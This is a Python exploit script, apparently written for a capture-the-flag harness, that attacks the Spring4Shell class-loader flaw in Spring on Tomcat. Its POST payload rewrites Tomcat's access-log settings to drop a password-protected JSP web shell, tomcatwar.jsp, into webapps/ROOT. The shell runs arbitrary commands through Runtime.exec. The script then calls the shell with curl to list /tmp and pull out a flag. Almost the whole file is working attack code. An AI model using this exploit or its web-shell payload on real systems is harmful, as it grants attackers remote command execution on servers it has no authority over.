from urllib.parse import urljoin

import requests

from tool.base import match_flag, process, run_cmd


def Exploit(url):
    headers = {
        "suffix": "%>//",
        "c1": "Runtime",
        "c2": "<%",
        "DNT": "1",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    try:
        go = requests.post(
            url,
            headers=headers,
            data=data,
            timeout=15,
            allow_redirects=False,
            verify=False,
        )
        shellurl = urljoin(url, "tomcatwar.jsp")
        shellgo = requests.get(
            shellurl, timeout=15, allow_redirects=False, verify=False
        )
        if shellgo.status_code == 200:
            # print(f"漏洞存在，shell地址为:{shellurl}?pwd=j&cmd=whoami")
            return True, "ok"
        return False, "Exploit Error"
    except Exception as e:
        return False, str(e)


def run(target: str):

    ok, err = Exploit(target)
    if not ok:
        return False, "", err

    cr = run_cmd(f"curl -s '{target}/tomcatwar.jsp?pwd=j&cmd=ls%20%2Ftmp'")
    if not cr.ok:
        return False, "", "error"
    flag = match_flag(cr.output)
    if not flag:
        print(cr.output)
        return False, "", "flag匹配失败"
    return True, flag, ""


def main(ip_port: str):
    process(ip_port, run)


if __name__ == "__main__":
    main("192.168.192.148:21396")
